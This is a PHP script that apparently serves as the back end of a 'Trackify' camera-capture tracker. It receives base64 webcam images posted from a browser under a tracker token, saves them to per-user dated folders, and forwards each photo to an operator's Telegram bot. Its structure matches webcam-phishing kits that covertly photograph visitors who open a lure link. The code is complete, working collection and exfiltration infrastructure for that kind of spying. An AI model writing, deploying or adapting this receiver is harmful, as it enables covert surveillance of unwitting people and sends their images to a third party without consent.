<?php

declare(strict_types=1);

require_once __DIR__ . '/trackify_capture.php';

$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if ($imageData === '' || !is_string($imageData)) {
    exit();
}

$tid = isset($_POST['tid']) ? (string) $_POST['tid'] : '';
$userId = trackify_user_id_for_token($tid);
if ($userId === null) {
    @error_log('post.php: invalid or missing tracker token (tid)', 3, __DIR__ . '/Log.log');
    exit();
}

$baseDir = trackify_user_capture_dir($userId);
$folderName = date('Y-m-d');
$dayDir = $baseDir . '/' . $folderName;
if (!is_dir($dayDir) && !@mkdir($dayDir, 0755, true)) {
    @error_log('post.php: cannot create ' . $dayDir, 3, __DIR__ . '/Log.log');
    exit();
}

$comma = strpos($imageData, ',');
if ($comma === false) {
    exit();
}
$filteredData = substr($imageData, $comma + 1);
$unencodedData = base64_decode($filteredData, true);
if ($unencodedData === false || $unencodedData === '') {
    exit();
}

$filePath = $dayDir . '/cam' . $date . '.png';
$written = @file_put_contents($filePath, $unencodedData, LOCK_EX);
if ($written === false) {
    @error_log('post.php: cannot write ' . $filePath, 3, __DIR__ . '/Log.log');
    exit();
}

@touch($baseDir . '/photo_pending.flag');

if (!empty($_POST['cat'])) {
    @error_log("Received\r\n", 3, __DIR__ . '/Log.log');
}

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = __DIR__ . '/telegram_config.json';

if (is_readable($config_file)) {
    $config_content = (string) file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if (is_array($config) && !empty($config['bot_token']) && !empty($config['chat_id'])) {
        $telegram_token = (string) $config['bot_token'];
        $telegram_chat = (string) $config['chat_id'];
    }
}

// Only send if Telegram is configured
if ($telegram_token !== '' && $telegram_chat !== '') {
    // Send photo to Telegram using cURL if available, otherwise use file_get_contents
    $url = 'https://api.telegram.org/bot' . $telegram_token . '/sendPhoto';
    $caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');

    if (function_exists('curl_file_create')) {
        // Use cURL (preferred method)
        $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
        $data = [
            'chat_id' => $telegram_chat,
            'photo' => $cfile,
            'caption' => $caption,
            'parse_mode' => 'Markdown',
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error !== '') {
            @error_log('Telegram cURL error: ' . $error, 3, __DIR__ . '/telegram_error.log');
        }
    } else {
        // Fallback to file_get_contents with multipart
        $boundary = uniqid('', true);
        $delimiter = '-------------' . $boundary;

        $postData = '';
        $postData .= '--' . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
        $postData .= $telegram_chat . "\r\n";

        $postData .= '--' . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
        $postData .= 'Content-Type: image/png' . "\r\n\r\n";
        $postData .= $unencodedData . "\r\n";

        $postData .= '--' . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
        $postData .= $caption . "\r\n";
        $postData .= '--' . $delimiter . "--\r\n";

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
                'content' => $postData,
                'timeout' => 10,
                'ignore_errors' => true,
            ],
        ];

        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);

        if ($result === false) {
            $error = error_get_last();
            if ($error !== null) {
                @error_log('Telegram send error: ' . $error['message'], 3, __DIR__ . '/telegram_error.log');
            }
        }
    }
}

exit();
